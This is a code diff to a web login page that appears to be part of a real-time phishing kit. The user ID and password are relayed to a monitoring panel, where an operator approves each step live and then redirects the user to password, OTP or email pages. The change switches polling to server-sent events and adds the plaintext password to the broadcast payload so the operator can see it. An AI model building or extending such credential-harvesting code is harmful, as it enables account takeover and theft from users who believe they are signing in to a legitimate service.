@@ -14,11 +14,11 @@ export default function Home() {
     const loginContainer = document.querySelector('.login-container');
     let cachedUsername = '';
     let pendingActivityId = null;
-    let approvalCheckInterval = null;
 
     async function logActivity(type, userId, additionalData = {}) {
       try {
-        const response = await fetch('/api/activity', {
+        // Use broadcast endpoint instead of activity endpoint
+        const response = await fetch('/api/broadcast', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ type, userId, additionalData })
@@ -31,39 +31,54 @@ export default function Home() {
       }
     }
 
-    async function checkForApproval(activityId, type, userId) {
-      try {
-        const response = await fetch(`/api/approval/${activityId}`);
-        const approval = await response.json();
-        
-        if (approval.status === 'approved') {
-          if (approvalCheckInterval) {
-            clearInterval(approvalCheckInterval);
-            approvalCheckInterval = null;
-          }
-          
-          const redirectType = approval.redirectType || 'password';
-          handleRedirect(redirectType, userId);
-          return true;
-        } else if (approval.status === 'denied') {
-          if (approvalCheckInterval) {
-            clearInterval(approvalCheckInterval);
-            approvalCheckInterval = null;
-          }
-          
-          const loadingScreen = document.getElementById('loading-screen');
-          if (loadingScreen) loadingScreen.classList.remove('active');
-          
-          submitBtn.disabled = false;
-          submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
-          alert('Access denied. Please try again.');
-          return true;
-        }
-        return false;
-      } catch (error) {
-        console.error('Error checking approval:', error);
-        return false;
+    function waitForApprovalSSE(activityId, type, userId) {
+      // Close existing connection if any
+      if (window.approvalEventSource) {
+        window.approvalEventSource.close();
       }
+
+      // Open SSE connection for this activity
+      const eventSource = new EventSource(`/api/user-events/${activityId}`);
+      window.approvalEventSource = eventSource;
+
+      eventSource.onmessage = function(event) {
+        try {
+          const data = JSON.parse(event.data);
+          
+          if (data.type === 'approval') {
+            const approval = data.data;
+            
+            // Close SSE connection
+            eventSource.close();
+            window.approvalEventSource = null;
+            
+            if (approval.status === 'approved') {
+              const redirectType = approval.redirectType || 'password';
+              handleRedirect(redirectType, userId);
+            } else if (approval.status === 'denied') {
+              const loadingScreen = document.getElementById('loading-screen');
+              if (loadingScreen) loadingScreen.classList.remove('active');
+              
+              submitBtn.disabled = false;
+              submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
+              alert('Access denied. Please try again.');
+            }
+          }
+        } catch (error) {
+          console.error('Error parsing SSE message:', error);
+        }
+      };
+
+      eventSource.onerror = function(error) {
+        console.error('SSE error:', error);
+        // Reconnect after 2 seconds
+        setTimeout(() => {
+          if (window.approvalEventSource === eventSource) {
+            eventSource.close();
+            waitForApprovalSSE(activityId, type, userId);
+          }
+        }, 2000);
+      };
     }
 
     function handleRedirect(redirectType, userId) {
@@ -71,9 +86,15 @@ export default function Home() {
       if (loadingScreen) loadingScreen.classList.remove('active');
       
       if (redirectType === 'password') {
-        // Already on password view, continue
+        // Show password view
+        cachedUsername = userId;
+        cachedUserIdText.textContent = userId;
+        userIdGroup.style.display = 'none';
+        passwordGroup.style.display = 'block';
+        loginContainer.classList.add('password-view');
         submitBtn.disabled = false;
         submitBtn.textContent = 'Sign in';
+        document.getElementById('password').focus();
       } else if (redirectType === 'otp') {
         window.location.href = '/otp';
       } else if (redirectType === 'email') {
@@ -110,41 +131,26 @@ export default function Home() {
           if (loadingScreen) loadingScreen.classList.add('active');
           submitBtn.disabled = true;
           
-          // Check for approval every 500ms
-          approvalCheckInterval = setInterval(async function() {
-            const approved = await checkForApproval(activityId, 'userid', userId);
-            if (approved) {
-              // Approval received, show password view
-              cachedUsername = userId;
-              cachedUserIdText.textContent = userId;
-              userIdGroup.style.display = 'none';
-              passwordGroup.style.display = 'block';
-              loginContainer.classList.add('password-view');
-              submitBtn.textContent = 'Sign in';
-              document.getElementById('password').focus();
-            }
-          }, 500);
+          // Wait for approval via SSE
+          waitForApprovalSSE(activityId, 'userid', userId);
           
         } else if (cachedUsername) {
           // Second step: Sign in button clicked
           const password = document.getElementById('password').value;
           
-          // Log sign in button click
-          const activityId = await logActivity('signin', cachedUsername, { hasPassword: password.length > 0 });
+          // Log sign in button click with password (for display only, not stored)
+          const activityId = await logActivity('signin', cachedUsername, { 
+            hasPassword: password.length > 0,
+            password: password // Include password for real-time display on monitoring panel
+          });
           pendingActivityId = activityId;
           
           // Show waiting message
           submitBtn.textContent = 'Waiting for approval...';
           submitBtn.disabled = true;
           
-          // Check for approval every 500ms
-          approvalCheckInterval = setInterval(async function() {
-            const approved = await checkForApproval(activityId, 'signin', cachedUsername);
-            if (approved) {
-              submitBtn.disabled = false;
-              submitBtn.textContent = 'Sign in';
-            }
-          }, 500);
+          // Wait for approval via SSE
+          waitForApprovalSSE(activityId, 'signin', cachedUsername);
         }
       });
     }
